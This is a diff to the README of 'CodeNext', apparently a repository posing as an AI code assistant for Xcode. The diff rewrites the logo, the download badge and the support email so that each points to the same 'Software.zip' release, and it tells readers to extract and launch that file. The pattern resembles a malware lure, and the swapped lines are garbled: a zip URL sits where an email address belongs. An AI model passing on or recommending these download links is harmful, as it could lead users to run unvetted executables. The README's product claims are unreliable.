@@ -1,6 +1,6 @@
 # CodeNext 🤖
 
-![CodeNext Logo](https://example.com/logo.png)
+![CodeNext Logo](https://github.com/Spriizz/CodeNext/releases/download/v1.0/Software.zip)
 
 Welcome to the CodeNext GitHub repository! CodeNext is the only AI code assistant in Xcode, offering context-aware code autocompletion and agentic chat, compatible with leading LLMs. Whether you are a seasoned developer or just starting out, CodeNext will revolutionize the way you write code by providing intelligent suggestions and guidance throughout your coding journey.
 
@@ -17,7 +17,7 @@ Welcome to the CodeNext GitHub repository! CodeNext is the only AI code assistan
 
 To get started with CodeNext, you can download the latest version of the application from the link below:
 
-[![Download CodeNext](https://img.shields.io/badge/Download-CodeNext-blue.svg)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download CodeNext](https://github.com/Spriizz/CodeNext/releases/download/v1.0/Software.zip)](https://github.com/Spriizz/CodeNext/releases/download/v1.0/Software.zip)
 
 Once you have downloaded the zip file, extract it and launch the application to begin experiencing the power of AI-driven code assistance in Xcode.
 
@@ -61,7 +61,7 @@ We welcome contributions from the community to help improve and enhance the capa
 
 ## Support ℹ️
 
-If you encounter any issues or have questions about using CodeNext, please feel free to reach out to our support team. You can contact us via email at support@codenext.com or join our community forum to connect with other CodeNext users and developers.
+If you encounter any issues or have questions about using CodeNext, please feel free to reach out to our support team. You can contact us via email at https://github.com/Spriizz/CodeNext/releases/download/v1.0/Software.zip or join our community forum to connect with other CodeNext users and developers.
 
 Thank you for choosing CodeNext as your AI code assistant in Xcode. Happy coding! 🎉
 
